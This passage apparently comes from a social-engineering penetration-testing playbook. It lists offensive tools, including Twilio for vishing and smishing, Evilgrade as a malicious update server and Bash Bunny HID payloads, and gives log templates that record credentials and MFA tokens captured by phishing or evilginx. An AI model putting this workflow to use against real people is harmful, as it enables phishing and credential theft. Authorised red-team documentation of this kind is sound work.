| Bash Bunny | HID payload USB | Hardware required |
| Twilio | Vishing/smishing infra | pip install twilio |
| Hunter.io | Email discovery | API |
| theHarvester | Email/domain OSINT | `apt install theharvester` |
| SpiderFoot | Automated OSINT | `pip install spiderfoot` |
| Evilgrade | Malicious update server | Kali included |

---

## CONTINUOUS.MD ENTRY TEMPLATES

```
## [TIMESTAMP] PHASE
Phase: [0-8]
Target: [domain/person]
Objective: [what this phase achieves]
Workspace: [path]

## [TIMESTAMP] COMMAND
Tool: [name]
Command: [exact command run]
Output: [key findings, truncated]
File: [output saved to path]

## [TIMESTAMP] FINDING
Title: [short title]
Severity: CRITICAL/HIGH/MEDIUM/LOW
Channel: email/phone/physical/SMS
Target: [name and role]
Result: [what was obtained]
Evidence: [file path + sha256]
State: confirmed

## [TIMESTAMP] CREDENTIAL
Type: [session-cookie/password/mfa-token/api-key]
Source: [evilginx/vishing/phishing]
Target system: [what it accesses]
Value: REDACTED — see loot/credentials/[file]
Fingerprint: sha256:[hash of raw value]
```
